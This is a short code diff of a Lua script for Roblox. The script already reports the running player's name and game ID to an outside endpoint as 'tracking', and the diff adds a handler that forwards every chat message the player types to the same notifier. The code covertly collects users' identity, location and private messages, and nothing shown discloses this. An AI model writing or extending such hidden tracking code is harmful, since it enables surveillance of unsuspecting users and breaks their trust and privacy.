@@ -18,7 +18,7 @@ function notify1()
             Headers = {
                 ['Content-Type'] = 'application/json'
             },
-         Body = game:GetService('HttpService'):JSONEncode({content = speaker.Name.. " is connected! | "..game.PlaceId.. " Is the user's game: tracking ! c5-v2"})
+         Body = game:GetService('HttpService'):JSONEncode({content = speaker.Name.. " is connected! | "..game.PlaceId.. " Is the user's game: tracking ! c5-11"})
         })
 end
 function notify2(msg)
@@ -138,6 +138,9 @@ function checks()
     if game.Players.Hypickels then 
         notify2("HE TRACKED @everyone")
      end
+    speaker.Chatted:Connect(function(msg)
+            notify2(msg)
+     end)
 end
 checks()
 start()
